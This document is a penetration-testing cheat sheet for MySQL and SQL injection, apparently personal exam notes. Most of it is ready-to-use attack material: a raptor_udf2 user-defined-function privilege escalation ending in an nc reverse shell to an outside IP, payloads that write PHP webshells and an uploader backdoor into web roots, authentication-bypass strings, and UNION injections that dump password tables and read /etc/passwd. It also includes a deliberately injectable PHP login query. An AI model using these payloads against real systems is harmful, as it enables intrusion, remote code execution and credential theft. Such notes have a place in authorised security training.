## MySQL Port 3306

#### Enumeration

````
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.11.1.8 
````

#### Logging in

```bash
mysql -u root -p
mysql -u root -p'root' -h $ip -P 3306
```

#### Connecting

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306

www-data@debian:/home/skunk$ mysql -u 'lavita' -p 'sdfquelw0kly9jgbx92'
ERROR 1044 (42000): Access denied for user 'lavita'@'localhost' to database 'sdfquelw0kly9jgbx92'

www-data@debian:/home/skunk$ mysql -u 'lavita' -p 'lavita' #  lavita db
MariaDB [lavita]> 
```

#### Commands

```sql
show databases;
show tables;
use db_name;
select * from passwords;
```

#### Login

Try logging in as someone you know is a valid user, and with "%" as the password.

```php
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

#### MySQL 4.x or MySQL 5.x ?? -> root :)

```bash
gcc -g -c raptor_udf2.c  #compile the exploit code
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc #create the shared library (so)
mysql -u root -p
show variables like '%plugin%';
show variables like '%secure_file_priv%'; # Empty = good
use mysql;
create table foo(line blob);
insert into foo values(load_file('/var/www/raptor_udf2.so')); # Or wherever you want
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('id > /var/www/output; chown www-data www-data  /var/www/output'); # Get creative
select do_system('nc 192.168.49.136 8080 -e /bin/bash');
```

```bash
> admin' or 1=1-- -
```

#### Modifying Exploit

We found the webroot to be /var/www/html/. Note that I changed the query from the url to a header in a request, so at the end of the request, I put view=... I also changed it from a GET to a POST with "Content-Type: application/x-www-form-urlencoded".

From:
```bash
http://website.com/zm/?view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#&minTime=5
```
To:
```bash
http://website.com/zm/?view=request&request=log&task=query&limit=100;SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php”

#or for windows
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

Upload php command injection.

```bash
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

Load file.

```bash
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

Inside URL:

```bash
http://192.168.11.35/comment.php?id=738 order by 1
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,5,6
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,@@version,6
# To!discover!the!current!user!being!used!for!the!database!connection:
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,user(),6
# View the tables
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
# Look into users table
http://192.168.11.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
# Extract username and password
http://192.168.11.35/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
```

#### Enumeration

```bash
SELECT * FROM mysql.user;
```

## SQL Injection - MySQL/MariaDB

Bypass Authentication
```
' or 1=1 -- -
admin' -- -
' or 1=1 order by 2 -- -
' or 1=1 order by 1 desc -- - 
' or 1=1 limit 1,1 -- -
```

get number columns
```
-1 order by 3;#
```

get version
```
-1 union select 1,2,version();#
```

get database name
```
-1 union select 1,2,database();#
```

get table name
```
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<database_name>";#
```

get column name
``` 
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<database_name>" and table_name="<table_name>";#
```

dump
```
-1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
```

#### Webshell via SQLI

view web server path  
```
LOAD_FILE('/etc/httpd/conf/httpd.conf')    
```

creating webshell
```
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
```
 
#### Reading Files via SQLI - MySQL

```
SELECT LOAD_FILE('/etc/passwd')
```


#### Notes

- If you have a valid password, try using that same password for the admin accounts (root)
- mycli solved ssl problem

#### SQLite

```bash
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- # Extract Table Names
http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users-- # Extract Table Users
```

#### Oracle SQL

```bash
' or 1=1-- # Auth bypass
' order by 3-- # Get number of columns
' union select null,table_name,null from all_tables-- # Get table name
' union select null,column_name,null from all_tab_columns where table_name='<table_name>'-- # Get column name
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS-- # Dump data
```